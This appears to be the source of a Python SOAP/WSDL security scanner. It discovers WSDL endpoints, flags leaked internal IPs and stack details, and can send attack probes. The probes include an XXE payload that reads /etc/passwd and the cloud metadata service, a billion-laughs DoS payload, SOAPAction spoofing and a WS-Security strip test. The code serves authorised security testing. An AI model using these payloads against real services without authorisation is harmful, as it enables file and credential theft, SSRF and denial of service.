"""
security/soap.py — SOAP / WSDL Security Scanner
=================================================
Checks
------
  1. WSDL discovery      — find ?wsdl, enumerate all operations
  2. XXE injection       — XML External Entity in SOAP body
  3. SOAPAction spoofing — call operations the UI doesn't expose
  4. WS-Security strip   — remove security header, see if server processes anyway
  5. Large payload DoS   — billion laughs / XML expansion
  6. Param tampering     — modify values in SOAP body
  7. WSDL info leakage   — internal hosts, service URLs, tech stack in WSDL
"""

import re
from dataclasses import dataclass, field
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich import box

from core.runner import Runner

console = Console()

# ── Common WSDL discovery paths ───────────────────────────────────────────────
WSDL_PATHS = [
    "?wsdl", "?WSDL", "/wsdl", "/.wsdl",
    "?disco", "/service.asmx?wsdl",
    "/services?wsdl", "/ws?wsdl",
    "/api/soap?wsdl", "/soap/wsdl",
]

# ── SOAP envelope templates ───────────────────────────────────────────────────
SOAP_ENVELOPE = """<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope
  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:tns="{namespace}">
  <soapenv:Header/>
  <soapenv:Body>
    <tns:{operation}>
      {params}
    </tns:{operation}>
  </soapenv:Body>
</soapenv:Envelope>"""

XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <foo>&xxe;</foo>
    <bar>&xxe2;</bar>
  </soapenv:Body>
</soapenv:Envelope>"""

BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><lolz>&lol4;</lolz></soapenv:Body>
</soapenv:Envelope>"""

SOAP_HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction":   '""',
}

# ── Internal IP/host patterns in WSDL ────────────────────────────────────────
_INTERNAL_IP_RE  = re.compile(
    r"(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)"
)
_STACK_HINTS_RE  = re.compile(
    r"(\.NET|java|spring|axis|cxf|metro|wsit|jax-ws|wss4j)", re.IGNORECASE
)


# ═══════════════════════════════════════════════════════════════════════════
#  Parsed WSDL operation
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class WSDLOperation:
    name:      str
    namespace: str = ""
    input:     list[str] = field(default_factory=list)
    output:    list[str] = field(default_factory=list)


# ═══════════════════════════════════════════════════════════════════════════
#  Finding
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class SOAPFinding:
    check:    str
    severity: str
    result:   str       # VULNERABLE | INFO | NOT_VULNERABLE
    detail:   str
    evidence: str = ""


# ═══════════════════════════════════════════════════════════════════════════
#  Scanner
# ═══════════════════════════════════════════════════════════════════════════

class SOAPScanner:

    def __init__(self, proxy: str | None = None, timeout: int = 20):
        self.runner  = Runner(proxy=proxy, timeout=timeout, verify_ssl=False)
        self.timeout = timeout

    def _soap_post(self, url: str, body: str, soap_action: str = '""'):
        headers = {**SOAP_HEADERS, "SOAPAction": soap_action}
        return self.runner.post(url, body=body, headers=headers)

    # ── Main scan ────────────────────────────────────────────────────────────

    def scan(self, url: str, run_attacks: bool = False) -> list[SOAPFinding]:
        findings: list[SOAPFinding] = []
        console.print(f"\n[cyan]🧼 SOAP scan:[/cyan] {url}\n")

        # ── 1. WSDL discovery ────────────────────────────────────────────
        console.print("  [dim]1. Probing for WSDL…[/dim]")
        wsdl_url    = None
        wsdl_body   = ""
        operations: list[WSDLOperation] = []

        # Try appending known WSDL paths
        base = url.rstrip("?")
        for path in WSDL_PATHS:
            probe = base + path
            r     = self.runner.get(probe)
            if r.status_code == 200 and r.body and (
                "wsdl" in r.body.lower() or
                "definitions" in r.body.lower() or
                "schema" in r.body.lower()
            ):
                wsdl_url  = probe
                wsdl_body = r.body
                console.print(f"    [green]✓ WSDL found:[/green] {probe}")
                break

        if wsdl_url:
            operations = self._parse_wsdl(wsdl_body)
            console.print(f"    [cyan]Operations found:[/cyan] {len(operations)}")
            for op in operations[:10]:
                console.print(f"    [dim]  · {op.name}[/dim]")

            findings.append(SOAPFinding(
                check="wsdl_exposed", severity="MEDIUM",
                result="VULNERABLE",
                detail=f"WSDL exposed at {wsdl_url} — full service contract discoverable",
                evidence=f"{len(operations)} operations found",
            ))

            # ── WSDL info leakage ────────────────────────────────────────
            console.print("  [dim]2. Scanning WSDL for info leakage…[/dim]")
            internal_ips = _INTERNAL_IP_RE.findall(wsdl_body)
            stack_hints  = _STACK_HINTS_RE.findall(wsdl_body)

            if internal_ips:
                console.print(f"    [red]⚠ Internal IPs in WSDL:[/red] {set(internal_ips)}")
                findings.append(SOAPFinding(
                    check="wsdl_info_leak", severity="HIGH",
                    result="VULNERABLE",
                    detail=f"Internal IP addresses exposed in WSDL",
                    evidence=str(set(internal_ips)),
                ))
            if stack_hints:
                console.print(f"    [yellow]⚠ Stack hints:[/yellow] {set(stack_hints)}")
                findings.append(SOAPFinding(
                    check="wsdl_stack_leak", severity="LOW",
                    result="VULNERABLE",
                    detail=f"Technology stack hints in WSDL",
                    evidence=str(set(stack_hints)),
                ))
        else:
            console.print("    [dim]No WSDL found at common paths.[/dim]")
            findings.append(SOAPFinding(
                check="wsdl_exposed", severity="INFO",
                result="NOT_VULNERABLE",
                detail="No WSDL exposed at common paths",
            ))

        if run_attacks:
            findings += self._run_attacks(url, operations)

        return findings

    # ── Attack suite ─────────────────────────────────────────────────────────

    def _run_attacks(self, url: str,
                     operations: list[WSDLOperation]) -> list[SOAPFinding]:
        findings: list[SOAPFinding] = []

        # ── 3. XXE injection ────────────────────────────────────────────
        console.print("  [dim]3. Testing XXE injection…[/dim]")
        r = self._soap_post(url, XXE_PAYLOAD)
        if r.status_code and r.body:
            xxe_hits = [
                hint for hint in ["root:","passwd","daemon:","bin:","sys:",
                                  "ami-","instance-id","hostname"]
                if hint in r.body
            ]
            if xxe_hits:
                console.print(f"    [bold red]⚠ XXE CONFIRMED — data in response:[/bold red] {xxe_hits}")
                findings.append(SOAPFinding(
                    check="xxe_injection", severity="CRITICAL",
                    result="VULNERABLE",
                    detail="XML External Entity injection successful — file/SSRF data returned",
                    evidence=f"Leaked data hints: {xxe_hits}  |  status={r.status_code}",
                ))
            elif r.status_code == 500:
                console.print(f"    [yellow]⚠ XXE caused 500 — parser may have processed entities[/yellow]")
                findings.append(SOAPFinding(
                    check="xxe_injection", severity="HIGH",
                    result="VULNERABLE",
                    detail="XXE payload caused server error — XML entities likely processed",
                    evidence=f"500 response to DOCTYPE payload",
                ))
            else:
                console.print(f"    [green]✓ XXE not confirmed ({r.status_code})[/green]")

        # ── 4. WS-Security header strip ──────────────────────────────────
        console.print("  [dim]4. Testing WS-Security header stripping…[/dim]")
        if operations:
            op  = operations[0]
            env = SOAP_ENVELOPE.format(
                namespace=op.namespace or "http://example.com",
                operation=op.name,
                params="<arg>test</arg>",
            )
            # With no WS-Security header at all
            r = self._soap_post(url, env)
            if r.status_code == 200 and r.body and "fault" not in r.body.lower():
                console.print(f"    [yellow]⚠ Operation processed without WS-Security header[/yellow]")
                findings.append(SOAPFinding(
                    check="ws_security_strip", severity="HIGH",
                    result="VULNERABLE",
                    detail=f"Operation '{op.name}' processed without any WS-Security header",
                    evidence=f"200 response, no Fault",
                ))
            else:
                console.print(f"    [green]✓ WS-Security enforced ({r.status_code})[/green]")

        # ── 5. SOAPAction spoofing ────────────────────────────────────────
        console.print("  [dim]5. Testing SOAPAction spoofing…[/dim]")
        if len(operations) > 1:
            # Send body of op[0] but SOAPAction of op[1]
            op_body   = operations[0]
            op_action = operations[1]
            env = SOAP_ENVELOPE.format(
                namespace=op_body.namespace or "http://example.com",
                operation=op_body.name,
                params="<arg>test</arg>",
            )
            r = self._soap_post(url, env, soap_action=f'"{op_action.name}"')
            if r.status_code == 200:
                console.print(f"    [yellow]⚠ SOAPAction mismatch accepted[/yellow]")
                findings.append(SOAPFinding(
                    check="soapaction_spoof", severity="MEDIUM",
                    result="VULNERABLE",
                    detail="Server dispatched based on SOAPAction header, not body operation name",
                    evidence=f"Body={op_body.name}  SOAPAction={op_action.name}  → 200",
                ))
            else:
                console.print(f"    [green]✓ SOAPAction validated ({r.status_code})[/green]")

        # ── 6. Billion laughs (DoS) ──────────────────────────────────────
        console.print("  [dim]6. Testing large payload / billion laughs…[/dim]")
        import time
        t0 = time.perf_counter()
        r  = self._soap_post(url, BILLION_LAUGHS)
        ms = (time.perf_counter() - t0) * 1000
        if ms > 5000 or (r.status_code and r.status_code == 500 and ms > 2000):
            console.print(f"    [yellow]⚠ Billion laughs took {ms:.0f}ms — DoS risk[/yellow]")
            findings.append(SOAPFinding(
                check="billion_laughs_dos", severity="HIGH",
                result="VULNERABLE",
                detail=f"XML entity expansion caused {ms:.0f}ms response — no entity limiting",
                evidence=f"Response time: {ms:.0f}ms",
            ))
        else:
            console.print(f"    [green]✓ Entity expansion handled ({ms:.0f}ms)[/green]")

        return findings

    # ── WSDL parser ──────────────────────────────────────────────────────────

    def _parse_wsdl(self, wsdl: str) -> list[WSDLOperation]:
        """Minimal WSDL parser — extracts operation names."""
        ops: list[WSDLOperation] = []
        op_re  = re.compile(r'<(?:wsdl:)?operation\s+name=["\']([^"\']+)["\']', re.IGNORECASE)
        ns_re  = re.compile(r'targetNamespace=["\']([^"\']+)["\']', re.IGNORECASE)

        namespace = ""
        ns_m = ns_re.search(wsdl)
        if ns_m:
            namespace = ns_m.group(1)

        seen = set()
        for m in op_re.finditer(wsdl):
            name = m.group(1)
            if name not in seen:
                seen.add(name)
                ops.append(WSDLOperation(name=name, namespace=namespace))

        return ops

    # ── Print ────────────────────────────────────────────────────────────────

    def print_findings(self, findings: list[SOAPFinding]):
        console.print()
        vulns = [f for f in findings if f.result == "VULNERABLE"]
        if not vulns:
            console.print("[green]✓ No SOAP vulnerabilities detected.[/green]")
            return

        console.print(f"[bold red]⚠ {len(vulns)} SOAP issue(s):[/bold red]\n")
        t = Table("Check","Severity","Detail","Evidence",
                  box=box.ROUNDED, header_style="bold red", show_lines=True)
        for f in vulns:
            sc = {"CRITICAL":"red","HIGH":"red","MEDIUM":"yellow","LOW":"dim"}.get(f.severity,"white")
            t.add_row(
                f"[bold]{f.check}[/bold]",
                f"[{sc}]{f.severity}[/{sc}]",
                f.detail[:80],
                f.evidence[:60],
            )
        console.print(t)

    def close(self):
        self.runner.close()
